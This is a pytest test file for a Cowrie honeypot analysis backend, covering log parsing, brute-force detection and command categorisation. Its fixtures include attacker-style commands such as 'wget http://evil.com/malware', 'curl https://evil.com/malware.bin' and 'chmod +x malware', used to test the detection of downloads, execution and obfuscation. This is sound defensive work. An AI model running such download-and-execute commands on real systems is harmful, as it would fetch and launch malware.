"""
Tests for analysis modules
"""
import pytest
from datetime import datetime, timedelta
from backend.analyzers.log_parser import CowrieLogParser
from backend.analyzers.pattern_analyzer import PatternAnalyzer
from backend.analyzers.command_analyzer import CommandAnalyzer


class TestCowrieLogParser:
    def test_parse_login_success(self):
        parser = CowrieLogParser()
        log_line = '''{"eventid": "cowrie.login.success", "username": "root", "password": "admin", "timestamp": "2024-01-01T10:00:00.000Z", "src_ip": "1.2.3.4", "session": "abc123"}'''

        event = parser.parse_log_line(log_line)

        assert event is not None
        assert event['event_type'] == 'login_success'
        assert event['username'] == 'root'
        assert event['password'] == 'admin'
        assert event['success'] is True

    def test_parse_command(self):
        parser = CowrieLogParser()
        log_line = '''{"eventid": "cowrie.command.input", "input": "whoami", "timestamp": "2024-01-01T10:00:01.000Z", "src_ip": "1.2.3.4", "session": "abc123"}'''

        event = parser.parse_log_line(log_line)

        assert event is not None
        assert event['event_type'] == 'command'
        assert event['command'] == 'whoami'

    def test_group_by_session(self):
        parser = CowrieLogParser()
        events = [
            {'session_id': 'session1', 'event_type': 'login_success'},
            {'session_id': 'session1', 'event_type': 'command'},
            {'session_id': 'session2', 'event_type': 'login_failed'},
        ]

        grouped = parser.group_by_session(events)

        assert len(grouped) == 2
        assert len(grouped['session1']) == 2
        assert len(grouped['session2']) == 1


class TestPatternAnalyzer:
    def test_detect_brute_force(self):
        analyzer = PatternAnalyzer()

        # Create rapid login attempts
        login_attempts = []
        base_time = datetime.utcnow()
        for i in range(20):
            login_attempts.append({
                'username': 'root',
                'password': f'pass{i}',
                'timestamp': base_time + timedelta(seconds=i*2)
            })

        result = analyzer.detect_brute_force(login_attempts, threshold=10)

        assert result['is_brute_force'] is True
        assert result['total_attempts'] == 20

    def test_categorize_commands(self):
        analyzer = PatternAnalyzer()

        commands = [
            {'command': 'whoami'},
            {'command': 'uname -a'},
            {'command': 'wget http://evil.com/malware'},
            {'command': 'chmod +x malware'},
        ]

        categories = analyzer.categorize_commands(commands)

        assert len(categories['reconnaissance']) == 2
        assert len(categories['download']) == 1
        assert len(categories['execution']) == 1


class TestCommandAnalyzer:
    def test_categorize_command(self):
        analyzer = CommandAnalyzer()

        assert analyzer.categorize_command('whoami') == 'reconnaissance'
        assert analyzer.categorize_command('wget http://test.com') == 'download'
        assert analyzer.categorize_command('chmod +x file') == 'execution'

    def test_extract_urls(self):
        analyzer = CommandAnalyzer()

        commands = [
            'wget http://example.com/file.sh',
            'curl https://evil.com/malware.bin',
            'ls -la'
        ]

        urls = analyzer.extract_urls(commands)

        assert len(urls) == 2
        assert 'http://example.com/file.sh' in urls
        assert 'https://evil.com/malware.bin' in urls

    def test_is_obfuscated(self):
        analyzer = CommandAnalyzer()

        assert analyzer.is_obfuscated('echo SGVsbG8gV29ybGQ= | base64 -d') is True
        assert analyzer.is_obfuscated('whoami') is False
